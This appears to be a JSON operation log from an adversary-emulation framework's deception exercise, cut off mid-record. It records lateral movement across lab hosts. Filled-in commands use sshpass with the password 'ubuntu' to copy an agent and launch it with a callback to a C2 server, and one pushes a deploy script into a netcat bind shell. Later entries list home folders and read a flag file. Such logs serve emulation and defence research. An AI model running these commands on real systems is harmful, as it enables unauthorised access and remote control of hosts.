"timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:15:38Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["11abc713-2c45-4581-a036-6720741de263", "303a7504-bfa3-465e-a1d6-2e588d293e4e"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.ip.address192.168.200.6", "created": "2023-10-03T20:15:34Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:38Z"}, {"deadman": false, "finish": "2023-10-03T20:16:02Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "fff41c72-23ab-4812-87e1-f3d24d976f46", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-03T20:15:56Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-03T20:15:56Z", "relationships": []}], "unique": "fff41c72-23ab-4812-87e1-f3d24d976f46", "decide": "2023-10-03T20:15:56Z", "status": 1, "score": 3, "pid": "2470", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-03T20:15:57Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:57Z"}, {"deadman": false, "finish": "2023-10-03T20:16:08Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "496f365b-ba61-49bb-b683-4580524e3340", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:16:06Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "activedir", "unique": "host.lateralMove.useractivedir", "created": "2023-10-03T20:16:06Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-03T20:16:06Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-03T20:16:06Z", "relationships": []}], "unique": "496f365b-ba61-49bb-b683-4580524e3340", "decide": "2023-10-03T20:16:06Z", "status": 1, "score": 15, "pid": "2488", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:16:08Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["496f365b-ba61-49bb-b683-4580524e3340", "d6e2505d-41d8-4627-9195-95624bc138fd"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.ip.address192.168.200.3", "created": "2023-10-03T20:16:08Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:08Z"}, {"deadman": false, "finish": "2023-10-03T20:16:28Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "d6e2505d-41d8-4627-9195-95624bc138fd", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-03T20:16:11Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "activedir", "unique": "host.lateralMove.useractivedir", "created": "2023-10-03T20:16:11Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-03T20:16:11Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-03T20:16:11Z", "relationships": []}], "unique": "d6e2505d-41d8-4627-9195-95624bc138fd", "decide": "2023-10-03T20:16:11Z", "status": 124, "score": 15, "pid": "2492", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-03T20:16:13Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["496f365b-ba61-49bb-b683-4580524e3340", "d6e2505d-41d8-4627-9195-95624bc138fd"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.ip.address192.168.200.3", "created": "2023-10-03T20:16:08Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:13Z"}, {"deadman": false, "finish": "2023-10-03T20:16:33Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "05fa8018-1547-4fba-9952-17d7b6f03be9", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:31Z", "relationships": []}], "unique": "05fa8018-1547-4fba-9952-17d7b6f03be9", "decide": "2023-10-03T20:16:31Z", "status": 0, "score": 1, "pid": "2598", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["finance"], "unique": "host.dir.children['finance']", "created": "2023-10-03T20:16:33Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:31Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209429b0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e8460>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-03T20:16:33Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["05fa8018-1547-4fba-9952-17d7b6f03be9"], "collected_by": ["hchyiu"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["finance"], "unique": "host.dir.children['finance']", "created": "2023-10-03T20:16:33Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['finance'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:33Z"}, {"deadman": false, "finish": "2023-10-03T20:16:40Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "cccc83db-77f8-4bc0-9e57-20508952a595", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:36Z", "relationships": []}], "unique": "cccc83db-77f8-4bc0-9e57-20508952a595", "decide": "2023-10-03T20:16:36Z", "status": 0, "score": 1, "pid": "2829", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["ceo"], "unique": "host.dir.children['ceo']", "created": "2023-10-03T20:16:40Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:36Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720ca5510>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe720b5a050>", "score": 1}], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-03T20:16:40Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["cccc83db-77f8-4bc0-9e57-20508952a595"], "collected_by": ["xuyzjc"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["ceo"], "unique": "host.dir.children['ceo']", "created": "2023-10-03T20:16:40Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['ceo'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:40Z"}, {"deadman": false, "finish": "2023-10-03T20:16:45Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:41Z", "relationships": []}], "unique": "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "decide": "2023-10-03T20:16:41Z", "status": 0, "score": 1, "pid": "2339", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-03T20:16:45Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:16:41Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720bdd630>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe72071ec20>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-03T20:16:45Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["54ad2d75-1d24-4e29-ab32-8b4b75ca53a9"], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-03T20:16:45Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:45Z"}, {"deadman": false, "finish": "2023-10-03T20:16:47Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "9c9344c2-1220-42b5-947e-ea1c1cbc3418", "plaintext_command": "cat /home/finance/flag.txt", "used": [{"trait": "host.file.path", "links": ["9c9344c2-1220-42b5-947e-ea1c1cbc3418"], "collected_by": ["hchyiu"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/finance/flag.txt", "unique": "host.file.path/home/finance/flag.txt", "created": "2023-10-03T20:16:46Z", "relationships": ["host.file.path(/home/finance/flag.txt) : has_contents : 